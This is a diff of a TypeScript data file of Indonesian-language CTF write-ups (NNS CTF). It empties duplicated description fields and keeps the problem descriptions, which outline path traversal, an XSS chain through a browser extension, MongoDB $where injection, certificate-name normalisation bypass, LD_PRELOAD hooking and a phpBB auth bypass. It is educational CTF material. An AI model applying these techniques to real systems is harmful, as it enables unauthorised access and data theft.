-    "description": "Binary bergantung pada fungsi libc `time()` untuk mendapatkan waktu saat ini.\n\nProgram mengubah timestamp menjadi jumlah hari sejak Unix epoch dan hanya melanjutkan jika hasilnya sama dengan:\n\n```text\n0x2cbf34\n```\n\nNilai tersebut adalah jumlah hari dari:\n\n```text\n1970-01-01\n```\n\nhingga:\n\n```text\n9999-01-01\n```\n\nJadi tanggal yang diharapkan program adalah 1 Januari 9999.\n\nMengubah system clock tidak diperlukan. Binary bersifat dynamically linked dan hanya mengimpor `time()` dari libc, sehingga `LD_PRELOAD` dapat digunakan untuk mengganti implementasi `time()` dengan fungsi buatan sendiri.",
+    "description": "",
     "problemDescription": "Binary bergantung pada fungsi libc `time()` untuk mendapatkan waktu saat ini.\n\nProgram mengubah timestamp menjadi jumlah hari sejak Unix epoch dan hanya melanjutkan jika hasilnya sama dengan:\n\n```text\n0x2cbf34\n```\n\nNilai tersebut adalah jumlah hari dari:\n\n```text\n1970-01-01\n```\n\nhingga:\n\n```text\n9999-01-01\n```\n\nJadi tanggal yang diharapkan program adalah 1 Januari 9999.\n\nMengubah system clock tidak diperlukan. Binary bersifat dynamically linked dan hanya mengimpor `time()` dari libc, sehingga `LD_PRELOAD` dapat digunakan untuk mengganti implementasi `time()` dengan fungsi buatan sendiri.",
     "tools": [
       "Python 3",
@@ -2116,7 +2116,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Bug ada di perbedaan cara aplikasi menangani nama sertifikat.\n\n- Endpoint `/certificates` mencegah duplikasi nama dengan `issued_names`, jadi yang dicek string mentah.\n- Endpoint `/admin` tidak cek profile sertifikat. Ia cuma cek subject sertifikat yang dipresentasi sama dengan subject sertifikat admin pertama.\n- `ca.subject()` memakai `asn1crypto.x509.Name`, dan equality di sana melakukan stringprep. Karakter `ẞ` di-fold jadi `ss`, sehingga beberapa nama beda dianggap subject yang sama.\n\nPasangan yang dipakai:\n\n- Admin: `SSSẞ`\n- Client: `SSẞS`\n\nKedua string itu beda untuk `issued_names`, tapi subject hasil normalisasinya sama, jadi sertifikat `CLIENT` bisa lolos sebagai admin.",
+    "description": "",
     "problemDescription": "Bug ada di perbedaan cara aplikasi menangani nama sertifikat.\n\n- Endpoint `/certificates` mencegah duplikasi nama dengan `issued_names`, jadi yang dicek string mentah.\n- Endpoint `/admin` tidak cek profile sertifikat. Ia cuma cek subject sertifikat yang dipresentasi sama dengan subject sertifikat admin pertama.\n- `ca.subject()` memakai `asn1crypto.x509.Name`, dan equality di sana melakukan stringprep. Karakter `ẞ` di-fold jadi `ss`, sehingga beberapa nama beda dianggap subject yang sama.\n\nPasangan yang dipakai:\n\n- Admin: `SSSẞ`\n- Client: `SSẞS`\n\nKedua string itu beda untuk `issued_names`, tapi subject hasil normalisasinya sama, jadi sertifikat `CLIENT` bisa lolos sebagai admin.",
     "tools": [
       "Python 3",
@@ -2174,7 +2174,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Bug yang kepakai ada dua:\n\n1. Stored HTML injection di reader karena body dokumen dirender pakai `innerHTML`.\n2. Cache poisoning/leak di browser bot karena request ke `/api/documents/welcome?key=x&view=editor` masih bisa mengambil response lama kalau dipanggil dengan `fetch(..., { cache: \"force-cache\" })`.",
+    "description": "",
     "problemDescription": "Bug yang kepakai ada dua:\n\n1. Stored HTML injection di reader karena body dokumen dirender pakai `innerHTML`.\n2. Cache poisoning/leak di browser bot karena request ke `/api/documents/welcome?key=x&view=editor` masih bisa mengambil response lama kalau dipanggil dengan `fetch(..., { cache: \"force-cache\" })`.",
     "tools": [
       "Python 3",
@@ -2232,7 +2232,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Bug ada di serialisasi kolom `Point` saat backend menerima lokasi dari EXIF `UserComment`. `JsonElement` bukan `ITuple` atau `IList`, sehingga `ClickHouse.Driver` menulis 0 byte untuk kolom `location`. Byte kolom berikutnya lalu bergeser.",
+    "description": "",
     "problemDescription": "Bug ada di serialisasi kolom `Point` saat backend menerima lokasi dari EXIF `UserComment`. `JsonElement` bukan `ITuple` atau `IList`, sehingga `ClickHouse.Driver` menulis 0 byte untuk kolom `location`. Byte kolom berikutnya lalu bergeser.",
     "tools": [
       "Python 3",
@@ -2286,7 +2286,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Flag disisipkan backend ke isi file upload ketika konten memuat token `FLAG`.\nMongoDB mengizinkan JavaScript server-side lewat operator `$where`, dan module\nloader JavaScript dapat membaca file relatif dari `/tmp` dengan specifier\n`../tmp/<nama-file>`. File JavaScript upload kemudian melempar flag sebagai\nexception, sehingga flag muncul di response error MongoDB.",
+    "description": "",
     "problemDescription": "Flag disisipkan backend ke isi file upload ketika konten memuat token `FLAG`.\nMongoDB mengizinkan JavaScript server-side lewat operator `$where`, dan module\nloader JavaScript dapat membaca file relatif dari `/tmp` dengan specifier\n`../tmp/<nama-file>`. File JavaScript upload kemudian melempar flag sebagai\nexception, sehingga flag muncul di response error MongoDB.",
     "tools": [
       "Python 3",
@@ -2344,7 +2344,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Aplikasi menyediakan form untuk memasukkan booking reference/PΝR.\n\nFrontend meminta file melalui:\n\n```text\n/get-file?pnr=<PNR>.json\n```\n\nMasalahnya ada di backend:\n\n```ts\nconst ticket = url.searchParams.get('pnr');\nconst f = Bun.file('./tickets/' + ticket);\n```\n\nInput `pnr` langsung digabungkan ke path file tanpa sanitasi atau pembatasan directory.\n\nIni memungkinkan **path traversal** menggunakan `../` untuk keluar dari directory `tickets` dan membaca file lain yang bisa diakses proses.\n\nTarget flag diketahui dari deskripsi:\n\n```text\n/flag.txt\n```",
+    "description": "",
     "problemDescription": "Aplikasi menyediakan form untuk memasukkan booking reference/PΝR.\n\nFrontend meminta file melalui:\n\n```text\n/get-file?pnr=<PNR>.json\n```\n\nMasalahnya ada di backend:\n\n```ts\nconst ticket = url.searchParams.get('pnr');\nconst f = Bun.file('./tickets/' + ticket);\n```\n\nInput `pnr` langsung digabungkan ke path file tanpa sanitasi atau pembatasan directory.\n\nIni memungkinkan **path traversal** menggunakan `../` untuk keluar dari directory `tickets` dan membaca file lain yang bisa diakses proses.\n\nTarget flag diketahui dari deskripsi:\n\n```text\n/flag.txt\n```",
     "tools": [
       "Python 3",
@@ -2393,7 +2393,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Challenge ini memakai bot Firefox dengan extension WebExtension. Endpoint hanya memeriksa prefix URL secara string, sedangkan browser mem-parsing URL dengan aturan userinfo. Extension juga menerima `postMessage` tanpa validasi origin dan menyimpan origin hasil parsing ke konfigurasi.\n\nChain exploit:\n\n1. Host halaman HTML dan kirim URL berbentuk `https://host-kita/https://doc.rust-lang.org/` ke halaman options extension melalui iframe.\n2. Gunakan iframe probe pada origin host-kita. Event `webNavigation` memenuhi pengecekan extension sehingga `cs.js` diinjeksi ke tab.\n3. Hook nonce yang dibuat `cs.js` agar nilai tersimpan sebagai `previous` berupa HTML XSS. Kembalikan konfigurasi ke `doc.rust-lang.org`, lalu navigasi ke `/stable/std/` untuk menjalankan XSS pada origin yang memiliki cookie flag.",
+    "description": "",
     "problemDescription": "Challenge ini memakai bot Firefox dengan extension WebExtension. Endpoint hanya memeriksa prefix URL secara string, sedangkan browser mem-parsing URL dengan aturan userinfo. Extension juga menerima `postMessage` tanpa validasi origin dan menyimpan origin hasil parsing ke konfigurasi.\n\nChain exploit:\n\n1. Host halaman HTML dan kirim URL berbentuk `https://host-kita/https://doc.rust-lang.org/` ke halaman options extension melalui iframe.\n2. Gunakan iframe probe pada origin host-kita. Event `webNavigation` memenuhi pengecekan extension sehingga `cs.js` diinjeksi ke tab.\n3. Hook nonce yang dibuat `cs.js` agar nilai tersimpan sebagai `previous` berupa HTML XSS. Kembalikan konfigurasi ke `doc.rust-lang.org`, lalu navigasi ke `/stable/std/` untuk menjalankan XSS pada origin yang memiliki cookie flag.",
     "tools": [
       "Python 3",
@@ -2451,7 +2451,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Bug-nya ada di phpBB 3.3.16 yang dipakai challenge ini. Versi itu kena `CVE-2026-48611`, auth bypass di flow `login_link`.\n\nSource lokal nunjukin flag dibaca dari `/flag.txt`, lalu dimasukkan ke private message milik `user_id=2` lewat [seed.php](/home/nata/ctf/NNSCTF/web/PHPismypassion/web_php-is-my-passion/seed.php:1).",
+    "description": "",
     "problemDescription": "Bug-nya ada di phpBB 3.3.16 yang dipakai challenge ini. Versi itu kena `CVE-2026-48611`, auth bypass di flow `login_link`.\n\nSource lokal nunjukin flag dibaca dari `/flag.txt`, lalu dimasukkan ke private message milik `user_id=2` lewat [seed.php](/home/nata/ctf/NNSCTF/web/PHPismypassion/web_php-is-my-passion/seed.php:1).",
     "tools": [
       "Python 3",
@@ -2509,7 +2509,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Web",
       "NNS CTF"
     ],
-    "description": "Challenge ini adalah blackbox web challenge tentang pemilihan kursi pesawat.\n\nHalaman menyediakan seat map dan tombol **Save**. Dari source frontend, request disimpan melalui endpoint `/save`:\n\n```javascript\nfetch('/save', {\n  method: 'POST',\n  body: JSON.stringify({\n    seat: selectedSeat,\n  }),\n});\n```\n\nResponse kemudian diperiksa:\n\n```javascript\nif (d.flag) {\n  location.reload();\n}\n```\n\nArtinya endpoint `/save` dapat mengembalikan `flag:true` ketika seat yang dipilih benar.",
+    "description": "",
     "problemDescription": "Challenge ini adalah blackbox web challenge tentang pemilihan kursi pesawat.\n\nHalaman menyediakan seat map dan tombol **Save**. Dari source frontend, request disimpan melalui endpoint `/save`:\n\n```javascript\nfetch('/save', {\n  method: 'POST',\n  body: JSON.stringify({\n    seat: selectedSeat,\n  }),\n});\n```\n\nResponse kemudian diperiksa:\n\n```javascript\nif (d.flag) {\n  location.reload();\n}\n```\n\nArtinya endpoint `/save` dapat mengembalikan `flag:true` ketika seat yang dipilih benar.",
     "tools": [
       "Python 3",
